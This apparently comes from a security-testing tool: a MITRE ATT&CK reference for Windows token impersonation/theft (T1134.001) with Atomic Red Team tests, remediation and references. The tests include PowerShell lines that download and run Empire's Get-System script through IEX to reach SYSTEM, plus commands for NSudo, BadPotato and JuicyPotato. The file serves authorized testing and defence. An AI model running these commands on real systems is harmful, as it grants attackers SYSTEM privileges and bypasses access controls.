---
name: "T1134.001_token-impersonationtheft"
description: "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1134.001
  - defense-evasion
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1134.001"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1134/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1134
  - T1134.002
  - T1134.003
  - T1134.004
  - T1134.005
prerequisites:
  - T1134
severity_boost:
  T1134: "Chain with T1134 for deeper attack path"
  T1134.002: "Chain with T1134.002 for deeper attack path"
  T1134.003: "Chain with T1134.003 for deeper attack path"
---

# T1134.001 Token Impersonation/Theft

> **Sub-technique of:** T1134

## High-Level Description

Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Token Impersonation/Theft technique is applicable to target environment
- [ ] Check Windows systems for indicators of Token Impersonation/Theft
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Named pipe client impersonation

Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).

Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
```

### Atomic Test 2: `SeDebugPrivilege` token duplication

Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
```

### Atomic Test 3: Launch NSudo Executable

Launches the NSudo executable for a short period of time and then exits.
NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.

**Supported Platforms:** windows

```powershell
Start-Process "#{nsudo_path}" -Argument "-U:T -P:E cmd"
Start-Sleep -Second 5
Stop-Process -Name "cmd" -force -erroraction silentlycontinue
```

**Dependencies:**

- NSudoLG.exe must exist in the specified path #{nsudo_path}

### Atomic Test 4: Bad Potato

https://github.com/BeichenDream/BadPotato
Privilege escalation using named pipe connections

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
cd "PathToAtomicsFolder\..\ExternalPayloads"
Start-Process .\BadPotato.exe notepad.exe
Start-Sleep -Second 20
Stop-Process -Name "notepad" -force -erroraction silentlycontinue
Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
```

**Dependencies:**

- BadPotato.exe must exist in the temp directory

### Atomic Test 5: Juicy Potato

This Atomic utilizes Juicy Potato to obtain privilege escalation.
Upon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.
This tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns.
[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
```

**Dependencies:**

- JuicyPotato.exe must exist on disk

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Token Impersonation/Theft by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1134.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1018 User Account Management

An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.

### M1026 Privileged Account Management

Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.

Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.

## Detection

### Behavior-chain detection for T1134.001 Access Token Manipulation: Token Impersonation/Theft on Windows

## Risk Assessment

| Finding                                        | Severity | Impact          |
| ---------------------------------------------- | -------- | --------------- |
| Token Impersonation/Theft technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [Microsoft Command-line Logging](https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing)
- [DuplicateToken function](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken)
- [Atomic Red Team - T1134.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1134.001)
- [MITRE ATT&CK - T1134.001](https://attack.mitre.org/techniques/T1134/001)
